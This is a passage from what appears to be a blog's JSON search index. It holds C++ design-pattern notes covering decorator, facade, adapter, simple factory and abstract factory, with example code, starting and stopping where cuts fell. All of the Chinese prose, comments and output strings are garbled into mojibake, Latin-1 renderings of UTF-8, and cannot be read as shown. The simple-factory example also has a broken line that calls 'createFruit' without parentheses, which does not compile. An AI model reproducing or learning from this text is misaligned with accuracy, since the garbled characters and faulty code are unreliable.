å¯ä»¥é€šè¿‡ä¸€ç§åŠ¨æ€çš„æ–¹å¼æ¥æ‰©å±•ä¸€ä¸ªå¯¹è±¡çš„åŠŸèƒ½ï¼Œä»è€Œå®ç°ä¸åŒçš„è¡Œä¸ºã€‚ å¯ä»¥å¯¹ä¸€ä¸ªå¯¹è±¡è¿›è¡Œå¤šæ¬¡è£…é¥°ã€‚ å…·ä½“æ„ä»¶ç±»ä¸å…·ä½“è£…é¥°ç±»å¯ä»¥ç‹¬ç«‹å˜åŒ–ï¼Œç”¨æˆ·å¯ä»¥æ ¹æ®éœ€è¦å¢åŠ æ–°çš„å…·ä½“æ„ä»¶ç±»å’Œå…·ä½“è£…é¥°ç±»ï¼ŒåŸæœ‰ç±»åº“ä»£ç æ— éœ€æ”¹å˜ï¼Œç¬¦åˆâ€œå¼€é—­åŸåˆ™â€ã€‚ ç¼ºç‚¹ ä½¿ç”¨è£…é¥°æ¨¡å¼è¿›è¡Œç³»ç»Ÿè®¾è®¡æ—¶äº§ç”Ÿå¾ˆå¤šå°å¯¹è±¡ï¼Œå¤§é‡å°å¯¹è±¡çš„äº§ç”ŸåŠ¿å¿…ä¼šå ç”¨æ›´å¤šçš„ç³»ç»Ÿèµ„æºï¼Œå½±å“ç¨‹åºçš„æ€§èƒ½ã€‚ é€‚ç”¨åœºæ™¯ åŠ¨æ€ã€é€æ˜çš„æ–¹å¼ç»™è€½æå¯¹è±¡æ·»åŠ èŒè´£ å½“ä¸èƒ½é‡‡ç”¨ç»§æ‰¿çš„æ–¹å¼å¯¹ç³»ç»Ÿè¿›è¡Œæ‰©å±•æˆ–è€…é‡‡ç”¨ç»§æ‰¿ä¸åˆ©äºç³»ç»Ÿæ‰©å±•å’Œç»´æŠ¤æ—¶å¯ä»¥ä½¿ç”¨è£…é¥°æ¨¡å¼ã€‚ è£…é¥°å™¨æ¨¡å¼å…³æ³¨äºåœ¨ä¸€ä¸ªå¯¹è±¡ä¸ŠåŠ¨æ€çš„æ·»åŠ æ–¹æ³•ã€‚ç„¶è€Œä»£ç†æ¨¡å¼å…³æ³¨äºæ§åˆ¶å¯¹è±¡çš„è®¿é—®ã€‚æ¢å¥è¯è¯´ï¼Œç”¨ä»£ç†æ¨¡å¼ï¼Œä»£ç†ç±»ï¼ˆproxy classï¼‰å¯ä»¥å¯¹å®ƒçš„å®¢æˆ·éšè—ä¸€ä¸ªå¯¹è±¡çš„å…·ä½“ä¿¡æ¯ã€‚å› æ­¤ï¼Œå½“ä½¿ç”¨ä»£ç†æ¨¡å¼çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¸¸å¸¸åœ¨ä¸€ä¸ªä»£ç†ç±»ä¸­åˆ›å»ºä¸€ä¸ªå¯¹è±¡çš„å®ä¾‹ã€‚å¹¶ä¸”ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨è£…é¥°å™¨æ¨¡å¼çš„æ—¶å€™ï¼Œæˆ‘ä»¬é€šå¸¸çš„åšæ³•æ˜¯å°†é™¢å£«å¯¹è±¡ä½œä¸ºä¸€ä¸ªå‚æ•°åˆ›ç»™è£…é¥°è€…çš„æ„é€ å™¨ã€‚ å¤–è§‚æ¨¡å¼ æ ¹æ®è¿ªç±³ç‰¹æ³•åˆ™ï¼Œå¦‚æœä¸¤ä¸ªç±»ä¸å¿…å½¼æ­¤ç›´æ¥é€šä¿¡ï¼Œé‚£ä¹ˆä¸¤ä¸ªç±»å°±ä¸åº”å½“å‘ç”Ÿç›´æ¥çš„ç›¸äº’ä½œç”¨ã€‚ ä¸€ä¸ªå¯¹è±¡åº”å½“å¯¹å…¶ä»–å¯¹è±¡å°½å¯èƒ½å°‘çš„äº†è§£ï¼Œä»è€Œé™ä½å„ä¸ªå¯¹è±¡ä¹‹é—´çš„è€¦åˆï¼Œæé«˜ç³»ç»Ÿçš„å¯ç»´æŠ¤æ€§ã€‚ ä¾‹å¦‚åœ¨ä¸€ä¸ªç¨‹åºä¸­ï¼Œå„ä¸ªæ¨¡å—ä¹‹é—´ç›¸äº’è°ƒç”¨æ—¶ï¼Œé€šå¸¸ä¼šæä¾›ä¸€ä¸ªç»Ÿä¸€çš„æ¥å£æ¥å®ç°ã€‚è¿™æ ·å…¶ä»–æ¨¡å—ä¸éœ€è¦äº†è§£å¦å¤–ä¸€ä¸ªæœ¨å—çš„å†…éƒ¨å®ç°ç»†èŠ‚ï¼Œå½“ä¸€ä¸ªæ¨¡å—å†…éƒ¨çš„å®ç°å‘ç”Ÿæ”¹å˜æ˜¯ï¼Œä¸ä¼šå½±å“å…¶ä»–æ¨¡å—çš„ä½¿ç”¨ã€‚ï¼ˆé»‘ç›’åŸç†ï¼‰ã€‚ Facadeæ¨¡å¼ä¹Ÿå«å¤–è§‚æ¨¡å¼ã€‚æ˜¯æœ‰GoFæå‡ºçš„23ä¸­è®¾è®¡æ¨¡å¼ä¸­çš„ä¸€ç§ã€‚Facadeæ¨¡å¼ä¸ºä¸€ç»„å…·æœ‰ç±»ä¼¼åŠŸèƒ½çš„ç±»ç¾¤ï¼Œæ¯”å¦‚ç±»åº“ã€å­ç³»ç»Ÿç­‰ç­‰ï¼Œæä¾›ä¸€ä¸ªä¸€è‡´çš„ç®€å•çš„ç•Œé¢ã€‚è¿™ä¸ªä¸€è‡´çš„ç®€å•çš„ç•Œé¢è¢«ç§°ä½œfacadeã€‚ Facade(å¤–è§‚è§’è‰²): ä¸ºè°ƒç”¨æ–¹ï¼Œå®šä¹‰ç®€å•çš„è°ƒç”¨æ¥å£ SubSystem(å­ç³»ç»Ÿè§’è‰²): åŠŸèƒ½æä¾›è€…ã€‚æŒ‡æä¾›åŠŸèƒ½çš„ç±»ç¾¤ï¼ˆæ¨¡å—æˆ–å­ç³»ç»Ÿï¼‰ã€‚ æ›´åŠ å…·ä½“çš„ç†è§£ç›´æ¥çœ‹ä»£ç å°±èƒ½æ˜ç™½ã€‚ ä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107// å¤–è§‚æ¨¡å¼.cpp : å®šä¹‰æ§åˆ¶å°åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚///* å¤–è§‚æ¨¡å¼å°±æ˜¯å°†å¤æ‚çš„å­ç±»ç³»ç»ŸæŠ½è±¡åˆ°åŒä¸€ä¸ªçš„æ¥å£è¿›è¡Œç®¡ç† å¤–ç•Œåªéœ€è¦é€šè¿‡æ­¤æ¥å£ä¸å­ç±»ç³»ç»Ÿè¿›è¡Œäº¤äº’ï¼Œè€Œä¸å¿…ç›´æ¥ä¸å¤æ‚çš„å­ç±»ç³»ç»Ÿè¿›è¡Œäº¤äº’ã€‚*/#include &quot;stdafx.h&quot;#include &lt;iostream&gt;using namespace std;// è¿™é‡Œå®šä¹‰å››ä¸ªå­—äº†ç³»ç»Ÿclass SubSystem1&#123;public: void Methor1() &#123; cout &lt;&lt; &quot;å­ç³»ç»Ÿæ–¹æ³•ä¸€&quot; &lt;&lt; endl; &#125;protected:private:&#125;;class SubSystem2&#123;public: void Methor2() &#123; cout &lt;&lt; &quot;å­ç³»ç»Ÿæ–¹æ³•äºŒ&quot; &lt;&lt; endl; &#125;protected:private:&#125;;class SubSystem3&#123;public: void Methor3() &#123; cout &lt;&lt; &quot;å­ç³»ç»Ÿæ–¹æ³•ä¸‰&quot; &lt;&lt; endl; &#125;protected:private:&#125;;class SubSystem4&#123;public: void Methor4() &#123; cout &lt;&lt; &quot;å­ç³»ç»Ÿæ–¹æ³•å››&quot; &lt;&lt; endl; &#125;protected:private:&#125;;/* å¤–è§‚ç±»ï¼Œæ¥å£ */class Facade&#123;public: Facade() &#123; one = new SubSystem1; two = new SubSystem2; three = new SubSystem3; four = new SubSystem4; &#125; ~Facade() &#123; delete one; delete two; delete three; delete four; &#125; void MethorA() &#123; cout &lt;&lt; &quot;æ–¹æ³•ç»„A()&quot; &lt;&lt; endl; one-&gt;Methor1(); two-&gt;Methor2(); &#125; void MethorB() &#123; cout &lt;&lt; &quot;æ–¹æ³•ç»„B()&quot; &lt;&lt; endl; three-&gt;Methor3(); four-&gt;Methor4(); &#125;protected:private: SubSystem1 *one; SubSystem2 *two; SubSystem3 *three; SubSystem4 *four;&#125;;int main()&#123; Facade facade; facade.MethorA(); facade.MethorB(); return 0;&#125; è¾“å‡ºï¼š æ–¹æ³•ç»„A() å­ç³»ç»Ÿæ–¹æ³•ä¸€ å­ç³»ç»Ÿæ–¹æ³•äºŒ æ–¹æ³•ç»„B() å­ç³»ç»Ÿæ–¹æ³•ä¸‰ å­ç³»ç»Ÿæ–¹æ³•å›› è¯·æŒ‰ä»»æ„é”®ç»§ç»­. . . æ¡ˆä¾‹ å¤–è§‚æ¨¡å¼è¾ƒä¸ºç®€å•ï¼Œå®ç°ä¸Šè¿°æ¨¡å¼ä¾æ¬¡å®ç°ç”µè§†ã€ç¯ã€éŸ³å“ã€éº¦å…‹é£ã€DVDã€æ¸¸æˆæœºå³å¯ï¼Œåœ¨æ­¤åŸºç¡€ä¸Šå®ç°å¤–è§‚ç±»Facadeï¼ˆå®¶åº­å½±é™¢ï¼‰å³å¯ã€‚ å¤–è§‚æ¨¡å¼çš„ä¼˜ç¼ºç‚¹ ä¼˜ç‚¹ ä»–å¯¹å®¢æˆ·ç«¯å±è”½äº†å­ç³»ç»Ÿç»„ä»¶ï¼Œå‡å°‘äº†å®¢æˆ·ç«¯æ‰€éœ€å¤„ç†çš„å¯¹è±¡æ•°ç›®ï¼Œå¹¶ä½¿å¾—å­ç³»ç»Ÿä½¿ç”¨èµ·æ¥æ›´åŠ å®¹æ˜“ã€‚é€šè¿‡å¼•å…¥å¤–è§‚æ¨¡å¼ï¼Œå®¢æˆ·ç«¯ä»£ç å°†å˜å¾—å¾ˆç®€å•ï¼Œé¢„æ”¯å…³è”çš„å¯¹è±¡ä¹Ÿå¾ˆå°‘ã€‚ å®ƒå®ç°äº†å­ç³»ç»Ÿä¸å®¢æˆ·ç«¯ä¹‹é—´çš„æ¾è€¦åˆå…³ç³»ï¼Œè¿™ä½¿å¾—å­ç³»ç»Ÿçš„å˜åŒ–ä¸ä¼šå½±å“åˆ°è°ƒç”¨å®ƒçš„å®¢æˆ·ç«¯ï¼Œåªéœ€è¦è°ƒæ•´å¤–è§‚ç±»å³å¯ã€‚ ä¸€ä¸ªå­ç³»ç»Ÿçš„ä¿®æ”¹å¯¹å…¶ä»–å­ç³»ç»Ÿæ²¡æœ‰ä»»ä½•å½±å“ã€‚ ç¼ºç‚¹ ä¸èƒ½å¾ˆå¥½åœ°é™åˆ¶å®¢æˆ·ç«¯ç›´æ¥ä½¿ç”¨å­ç³»ç»Ÿç±»ï¼Œå¦‚æœå¯¹å®¢æˆ·ç«¯è®¿é—®å­ç³»ç»Ÿç±»åšå¤ªå¤šçš„é™åˆ¶åˆ™å‡å°‘äº†å¯å˜æ€§å’Œçµæ´»æ€§ã€‚ å¦‚æœè®¾è®¡ä¸å½“ï¼Œå¢åŠ æ–°çš„å­ç³»ç»Ÿå¯èƒ½éœ€è¦ä¿®æ”¹å¤–è§‚ç±»çš„æºä»£ç ï¼Œè¿èƒŒäº†å¼€é—­åŸåˆ™ã€‚ é€‚ç”¨åœºæ™¯ å¤æ‚ç³»ç»Ÿéœ€è¦ç®€å•å…¥å£ä½¿ç”¨ã€‚ å®¢æˆ·ç«¯ç¨‹åºä¸å¤šä¸ªå­ç³»ç»Ÿä¹‹é—´å­˜åœ¨å¾ˆå¤§çš„ä¾èµ–æ€§ã€‚ åœ¨å±‚æ¬¡åŒ–ç»“æ„ä¸­ï¼Œå¯ä»¥ä½¿ç”¨å¤–è§‚æ¨¡å¼å®šä¹‰ç³»ç»Ÿä¸­æ¯ä¸€å±‚çš„å…¥å£ï¼Œå±‚ä¸å±‚ä¹‹é—´ä¸ç›´æ¥äº§ç”Ÿè”ç³»ï¼Œè€Œé€šè¿‡å¤–è§‚ç±»å»ºç«‹è”ç³»ï¼Œé™ä½å±‚ä¹‹é—´çš„è€¦åˆåº¦ã€‚ é€‚é…å™¨æ¨¡å¼ å°†ä¸€ä¸ªç±»çš„æ¥å£è½¬æ¢æˆå®¢æˆ·å¸Œæœ›çš„å¦å¤–ä¸€ä¸ªæ¥å£ã€‚ä½¿å¾—åŸæœ¬ç”±äºæ¥å£ä¸å…¼å®¹è€Œä¸èƒ½ä¸€èµ·å·¥ä½œçš„é‚£äº›ç±»å¯ä»¥ä¸€èµ·å·¥ä½œã€‚ é€‚é…å™¨æ¨¡å¼ä¸­çš„è§’è‰²å’ŒèŒè´£ Targetï¼ˆç›®æ ‡æŠ½è±¡ç±»ï¼‰ï¼šç›®æ ‡æŠ½è±¡ç±»å®šä¹‰å®¢æˆ·æ‰€éœ€æ¥å£ï¼Œå¯ä»¥ä½¿ä¸€ä¸ªæŠ½è±¡ç±»æˆ–æ¥å£ï¼Œä¹Ÿå¯ä»¥æ˜¯å…·ä½“ç±»ã€‚ Adapterï¼ˆé€‚é…å™¨ç±»ï¼‰ï¼šé€‚é…å™¨å¯ä»¥è°ƒç”¨å¦ä¸€ä¸ªæ¥å£ï¼Œä½œä¸ºä¸€ä¸ªè½¬æ¢å™¨ï¼Œå¯¹Adapteeå’ŒTargetè¿›è¡Œé€‚é…ï¼Œé€‚é…å™¨ç±»æ˜¯é€‚é…å™¨æ¨¡å¼çš„æ ¸å¿ƒï¼Œåœ¨å¯¹è±¡é€‚é…å™¨ä¸­ï¼Œä»–é€šè¿‡ç»§æ‰¿Targetå¹¶å…³è”ä¸€ä¸ªAdapteeå¯¹è±¡ä½¿äºŒè€…äº§ç”Ÿè”ç³»ã€‚ Adapteeï¼ˆé€‚é…è€…ç±»ï¼‰ï¼šé€‚é…è€…å³è¢«é€‚é…çš„è§’è‰²ï¼Œå®ƒå®šä¹‰äº†ä¸€ä¸ªå·²ç»å­˜åœ¨çš„æ¥å£ï¼Œè¿™ä¸ªæ¥å£éœ€è¦é€‚é…ï¼Œé€‚é…è€…ç±»ä¸€èˆ¬æ˜¯ä¸€ä¸ªå…·ä½“ç±»ï¼ŒåŒ…å«äº†å®¢æˆ·å¸Œæœ›ä½¿ç”¨çš„ä¸šåŠ¡æ–¹æ³•ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹å¯èƒ½æ²¡æœ‰é€‚é…è€…ç±»çš„æºä»£ç ã€‚ æ ¹æ®å¯¹è±¡é€‚é…å™¨æ¨¡å¼ç»“æ„å›¾ï¼Œåœ¨å¯¹è±¡é€‚é…å™¨ä¸­ï¼Œå®¢æˆ·ç«¯éœ€è¦è°ƒç”¨request()æ–¹æ³•ï¼Œè€Œé€‚é…è€…ç±»Adapteeæ²¡æœ‰è¯¥æ–¹æ³•ï¼Œä½†æ˜¯å®ƒæ‰€æä¾›çš„SpecificRequest()æ–¹æ³•ç¡®å®å®¢æˆ·ç«¯æ‰€éœ€è¦çš„ã€‚ä¸ºäº†æ˜¯å®¢æˆ·ç«¯èƒ½å¤Ÿä½¿ç”¨é€‚é…è€…ç±»ï¼Œéœ€è¦æä¾›ä¸€ä¸ªåŒ…è£…ç±»Adapterï¼Œå³é€‚é…å™¨ç±»ã€‚è¿™ä¸ªåŒ…è£…ç±»åŒ…è£…äº†ä¸€ä¸ªé€‚é…è€…çš„å®ä¾‹ï¼Œä»è€Œå°†å®¢æˆ·ç«¯ä¸é€‚é…è€…è¡”æ¥èµ·æ¥ï¼Œåœ¨é€‚é…å™¨çš„Request()æ–¹æ³•ä¸­è°ƒç”¨é€‚é…è€…çš„SpecificRequest()æ–¹æ³•ã€‚å› ä¸ºé€‚é…å™¨ç±»ä¸é€‚é…è€…ç±»æ˜¯å…³è”å…³ç³»ï¼ˆä¹Ÿå¯ç§°ä¹‹ä¸ºå§”æ´¾å…³ç³»ï¼‰ï¼Œæ‰€ä»¥è¿™ç§é€‚é…å™¨æ¨¡å¼ç§°ä¸ºå¯¹è±¡é€‚é…å™¨æ¨¡å¼ã€‚ æ¡ˆä¾‹ ä»£ç  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970// é€‚é…å™¨æ¨¡å¼.cpp : å®šä¹‰æ§åˆ¶å°åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚//#include &quot;stdafx.h&quot;#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;// targetclass V5&#123;public: virtual void uesV5() = 0;private:&#125;;class V220 &#123;public: virtual void useV220() &#123; cout &lt;&lt; &quot;ç”¨220Vç”µå‹è¿›è¡Œå……ç”µ&quot; &lt;&lt; endl; &#125;&#125;;// Adapter å……ç”µå™¨class ChargerAdapter : public V5&#123;public: virtual void uesV5() &#123; cout &lt;&lt; &quot;å……ç”µå™¨å¯¹ç”µå‹è¿›è¡Œé€‚é…&quot; &lt;&lt; endl; m_p220V.useV220(); &#125;protected:private: V220 m_p220V;&#125;;class Phone&#123;public: Phone() &#123; v5Adapter = new ChargerAdapter; &#125; ~Phone() &#123; if (v5Adapter != NULL) &#123; delete v5Adapter; v5Adapter = NULL; &#125; &#125; void charge() &#123; cout &lt;&lt; &quot;æ‰‹æœºè¿›è¡Œå……ç”µ&quot; &lt;&lt; endl; v5Adapter-&gt;uesV5(); &#125;private: // 5v æ‰‹æœºå……ç”µå™¨ V5 *v5Adapter;&#125;;int main()&#123; Phone iphone; iphone.charge(); return 0;&#125; è¾“å‡ºï¼š æ‰‹æœºè¿›è¡Œå……ç”µ å……ç”µå™¨å¯¹ç”µå‹è¿›è¡Œé€‚é… ç”¨220Vç”µå‹è¿›è¡Œå……ç”µ è¯·æŒ‰ä»»æ„é”®ç»§ç»­. . . é€‚é…å™¨æ¨¡å¼çš„ä¼˜ç¼ºç‚¹ ä¼˜ç‚¹ å°†ç›®æ ‡ç±»å’Œé€‚é…è€…ç±»è§£è€¦ã€‚é€šè¿‡å¼•å…¥ä¸€ä¸ªé€‚é…å™¨ç±»æ¥é‡ç”¨ç°æœ‰çš„é€‚é…è€…ç±»ï¼Œæ— éœ€ä¿®æ”¹åŸæœ‰ç»“æ„ã€‚ å¢åŠ äº†ç±»çš„é€æ˜æ€§å’Œå¤ç”¨æ€§ã€‚å°†å…·ä½“çš„ä¸šåŠ¡å®ç°è¿‡ç¨‹å°è£…åœ¨é€‚é…è€…ç±»ä¸­ï¼Œå¯¹äºå®¢æˆ·ç«¯ç±»è€Œè¨€æ˜¯é€æ˜çš„ï¼Œè€Œä¸”æé«˜äº†é€‚é…è€…çš„å¤ç”¨æ€§ï¼ŒåŒä¸€ä¸ªé€‚é…è€…ç±»å¯ä»¥åœ¨å¤šä¸ªä¸åŒçš„ç³»ç»Ÿä¸­å¤ç”¨ã€‚ çµæ´»æ€§å’Œæ‰©å±•æ€§éƒ½éå¸¸å¥½ã€‚å¯ä»¥å¾ˆæ–¹ä¾¿åœ°æ›´æ¢é€‚é…å™¨ï¼Œä¹Ÿå¯ä»¥åœ¨ä¸ä¿®æ”¹åŸæœ‰ä»£ç çš„åŸºç¡€ä¸Šå¢åŠ æ–°çš„é€‚é…å™¨ç±»ï¼Œå®Œå…¨ç¬¦åˆâ€œå¼€é—­åŸåˆ™â€ã€‚ ç¼ºç‚¹ é€‚é…å™¨ä¸­ç½®æ¢é€‚é…è€…ç±»çš„æŸäº›æ–¹æ³•æ¯”è¾ƒéº»çƒ¦ã€‚ é€‚åº”åœºæ™¯ ç³»ç»Ÿéœ€è¦ä½¿ç”¨ä¸€äº›ç°æœ‰çš„ç±»ï¼Œè€Œè¿™äº›ç±»çš„æ¥å£ï¼ˆå¦‚æ–¹æ³•åï¼‰ä¸ç¬¦åˆç³»ç»Ÿçš„éœ€è¦ï¼Œç”šè‡³æ²¡æœ‰è¿™äº›ç±»çš„æºä»£ç ã€‚ æƒ³åˆ›å»ºä¸€ä¸ªå¯ä»¥é‡å¤ä½¿ç”¨çš„ç±»ï¼Œç”¨äºä¸ä¸€äº›å½¼æ­¤ä¹‹é—´æ²¡æœ‰å¤ªå¤§å…³è”çš„ä¸€äº›ç±»ï¼ŒåŒ…æ‹¬ä¸€äº›å¯èƒ½åœ¨å°†æ¥å¼•è¿›çš„ç±»ä¸€èµ·å·¥ä½œã€‚ åˆ°æ­¤ï¼Œè®¾è®¡æ¨¡å¼ä¹‹ç»“æ„å‹æ¨¡å¼ã€‚over~~~ğŸ˜€ğŸŒ","tags":[{"name":"è®¾è®¡æ¨¡å¼","slug":"è®¾è®¡æ¨¡å¼","permalink":"https://hodlyounger.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"è®¾è®¡æ¨¡å¼/ç»“æ„å‹æ¨¡å¼","slug":"è®¾è®¡æ¨¡å¼-ç»“æ„å‹æ¨¡å¼","permalink":"https://hodlyounger.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F/"}],"categories":[{"name":"A_å†…åŠŸ","slug":"A-å†…åŠŸ","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/"},{"name":"B_è®¾è®¡æ¨¡å¼","slug":"A-å†…åŠŸ/B-è®¾è®¡æ¨¡å¼","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/B-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}]},{"title":"è®¾è®¡æ¨¡å¼ä¹‹åˆ›å»ºå‹æ¨¡å¼","date":"2023-12-25T01:28:27.242Z","path":"A_å†…åŠŸ/B_è®¾è®¡æ¨¡å¼/åˆ›å»ºå‹æ¨¡å¼/","text":"è®¾è®¡æ¨¡å¼ å­¦ä¹ ç¬”è®°ä¹‹C++è®¾è®¡æ¨¡å¼â€”â€”åˆ›å»ºå‹æ¨¡å¼ ğŸ“‘ è®¾è®¡æ¨¡å¼ä¹‹ç»“æ„å‹æ¨¡å¼ ğŸ“‘ è®¾è®¡æ¨¡å¼ä¹‹è¡Œä¸ºå‹æ¨¡å¼ ä¸€ã€å·¥å‚æ¨¡å¼ ç®€å•å·¥å‚æ¨¡å¼ ä»£ç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include &lt;iostream&gt;#include &quot;main.h&quot;using namespace std;/* å®šä¹‰ä¸€ä¸ªæ°´æœæŠ½è±¡ç±»ã€‚ä¾›å…·ä½“æ°´æœå®ç°ï¼Œå’Œå·¥å‚ä½¿ç”¨*/class Fruit &#123;public: virtual void getName() = 0;&#125;;class Apple : public Fruit&#123;public: virtual void getName() &#123; cout &lt;&lt; &quot;æˆ‘æ˜¯è‹¹æœ&quot; &lt;&lt; endl; &#125;&#125;;class Banana : public Fruit &#123;public: virtual void getName()&#123; cout &lt;&lt; &quot;æˆ‘æ˜¯é¦™è•‰&quot; &lt;&lt; endl; &#125;&#125;;//æŠ½è±¡çš„å·¥å‚ç±»class AbstractFactory&#123;public: virtual Fruit * createFruit() = 0;&#125;;//é€šè¿‡å…·ä½“çš„æŸä¸€äº§å“çš„å·¥å‚ç”Ÿäº§æŸç§äº§å“class AppleFactory : public AbstractFactory &#123;public: virtual Fruit * createFruit() &#123; return new Apple; &#125;&#125;;class BananaFactory : public AbstractFactory&#123;public: virtual Fruit * createFruit() &#123; return new Banana; &#125;&#125;;int main()&#123; //æ¥ä¸€ä¸ªé¦™è•‰å·¥å‚ AbstractFactory * bananaFactory = new BananaFactory; //ç»™æˆ‘æ¥ä¸€ä¸ªæ°´æœ Fruit * banana = bananaFactory-&gt;createFruit(); banana-&gt;getName(); delete bananaFactory; delete banana; AbstractFactory * appleFactory = new AppleFactory; Fruit * apple = appleFactory-&gt;createFruit; apple-&gt;getName(); system(&quot;pause&quot;); return 0;&#125; ç±»å›¾ å·¥å‚æ¨¡å¼çš„ä¼˜ç¼ºç‚¹ ä¼˜ç‚¹ ä¸éœ€è¦è®°ä½å…·ä½“ç±»åï¼Œç”šè‡³è¿å…·ä½“å‚æ•°éƒ½ä¸ç”¨è®°å¿†ã€‚ å®ç°äº†å¯¹è±¡åˆ›å»ºå’Œä½¿ç”¨çš„åˆ†ç¦»ã€‚ ç³»ç»Ÿçš„å¯æ‰©å±•æ€§ä¹Ÿå°±å˜å¾—ä¸ªéå¸¸å¥½ï¼Œæ— éœ€ä¿®æ”¹æ¥å£å’ŒåŸç±»ã€‚ ç¼ºç‚¹ å¢åŠ ç³»ç»Ÿä¸­ç±»çš„ä¸ªæ•°ï¼Œå¤æ‚åº¦å’Œç†è§£åº¦å¢åŠ ã€‚ å¢åŠ äº†ç³»ç»Ÿçš„æŠ½è±¡æ€§å’Œç†è§£éš¾åº¦ã€‚ äºŒã€æŠ½è±¡å·¥å‚æ¨¡å¼ å·¥å‚æ–¹æ³•æ¨¡å¼é€šè¿‡å¼•å…¥å·¥å‚ç­‰çº§ç»“æ„,è§£å†³äº†ç®€å•å·¥å‚æ¨¡å¼ä¸­å·¥å‚ç±»èŒè´£å¤ªé‡çš„é—®é¢˜,ä½†ç”±äºå·¥å‚æ–¹æ³•æ¨¡å¼ä¸­çš„æ¯ä¸ªå·¥å‚åªç”Ÿäº§-äº§å“ï¼Œå¯èƒ½ä¼šå¯¼è‡´ç³»ç»Ÿä¸­å­˜åœ¨å¤§é‡çš„å·¥å‚ç±»,åŠ¿å¿…ä¼šå¢åŠ ç³»ç»Ÿçš„å¼€é”€ã€‚æ­¤æ—¶,æˆ‘ä»¬å¯ä»¥è€ƒè™‘å°†ä¸€äº›ç›¸å…³çš„äº§å“ç»„æˆä¸€ä¸ª&quot;äº§å“æ—â€, ç”±åŒ-ä¸ªå·¥å‚æ¥ç»Ÿ-ç”Ÿäº§,è¿™å°±æ˜¯æˆ‘ä»¬æœ¬æ–‡å°†è¦å­¦ä¹ çš„æŠ½è±¡å·¥å‚æ¨¡å¼çš„åŸºæœ¬æ€æƒ³ã€‚ å›¾ä¾‹ ä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144#include &lt;iostream&gt;#include &quot;main.h&quot;using namespace std;//æŠ½è±¡äº§å“ç±» ä¾›å…·ä½“äº§åœ°äº§å“å®ç°class AbstractApple &#123;public: virtual void getName() = 0;&#125;;class AbstractBanana &#123;public: virtual void getName() = 0;&#125;;class AbstractPear &#123;public: virtual void getName() = 0;&#125;;class USAApple : public AbstractApple &#123;public: virtual void getName() &#123; cout &lt;&lt; &quot;ç¾å›½è‹¹æœ&quot; &lt;&lt; endl; &#125;&#125;;class ChinaApple : public AbstractApple &#123;public: virtual void getName() &#123; cout &lt;&lt; &quot;ä¸­å›½è‹¹æœ&quot; &lt;&lt; endl; &#125;&#125;;class JapanApple : public AbstractApple &#123;public: virtual void getName() &#123; cout &lt;&lt; &quot;æ—¥æœ¬è‹¹æœ&quot; &lt;&lt; endl; &#125;&#125;;class USABanana : public AbstractBanana &#123;public: virtual void getName() &#123; cout &lt;&lt; &quot;ç¾å›½é¦™è•‰&quot; &lt;&lt; endl; &#125;&#125;;class ChinaBanana : public AbstractBanana &#123;public: virtual void getName() &#123; cout &lt;&lt; &quot;ä¸­å›½é¦™è•‰&quot; &lt;&lt; endl; &#125;&#125;;class JapanBanana : public AbstractBanana &#123;public: virtual void getName() &#123; cout &lt;&lt; &quot;æ—¥æœ¬é¦™è•‰&quot; &lt;&lt; endl; &#125;&#125;;class USAPear : public AbstractPear &#123;public: virtual void getName() &#123; cout &lt;&lt; &quot;ç¾å›½é¸­æ¢¨&quot; &lt;&lt; endl; &#125;&#125;;class ChinaPear : public AbstractPear &#123;public: virtual void getName() &#123; cout &lt;&lt; &quot;ä¸­å›½é¸­æ¢¨&quot; &lt;&lt; endl; &#125;&#125;;class JapanPear : public AbstractPear &#123;public: virtual void getName() &#123; cout &lt;&lt; &quot;æ—¥æœ¬é¸­æ¢¨&quot; &lt;&lt; endl; &#125;&#125;;//æŠ½è±¡çš„å·¥å‚ç±»ï¼Œä¾›å…·ä½“äº§å“æ—çš„å®ç°class AbstractFactory &#123;public: virtual AbstractApple * creatApple() = 0; virtual AbstractBanana * creatBanana() = 0; virtual AbstractPear * creatPear() = 0;&#125;;//å…·ä½“çš„å·¥å‚class USAFactory : public AbstractFactory &#123;public: virtual AbstractApple * creatApple() &#123; return new USAApple; &#125; virtual AbstractBanana * creatBanana() &#123; return new USABanana; &#125; virtual AbstractPear * creatPear() &#123; return new USAPear; &#125;&#125;;class ChinaFactory : public AbstractFactory &#123;public: virtual AbstractApple * creatApple() &#123; return new ChinaApple; &#125; virtual AbstractBanana * creatBanana() &#123; return new ChinaBanana; &#125; virtual AbstractPear * creatPear() &#123; return new ChinaPear; &#125;&#125;;class JapanFactory : public AbstractFactory &#123;public: virtual AbstractApple * creatApple() &#123; return new JapanApple; &#125; virtual AbstractBanana * creatBanana() &#123; return new JapanBanana; &#125; virtual AbstractPear * creatPear() &#123; return new JapanPear; &#125;&#125;;int main()&#123; //ç°åœ¨è¦å‡†å¤‡ä¸€ä¸ª ä¸­å›½çš„è‹¹æœï¼Œä¸­å›½çš„é¦™è•‰ AbstractApple *AA = NULL; AbstractBanana *AB = NULL; AbstractPear *AP = NULL; AbstractFactory *factory = NULL; factory = new ChinaFactory; //ä¸­å›½çš„è‹¹æœ AA = factory-&gt;creatApple(); //ä¸­å›½çš„é¦™è•‰ AB = factory-&gt;creatBanana(); AP = factory-&gt;creatPear(); AA-&gt;getName(); AB-&gt;getName(); AP-&gt;getName(); delete AA; delete AB; delete AP; delete factory; 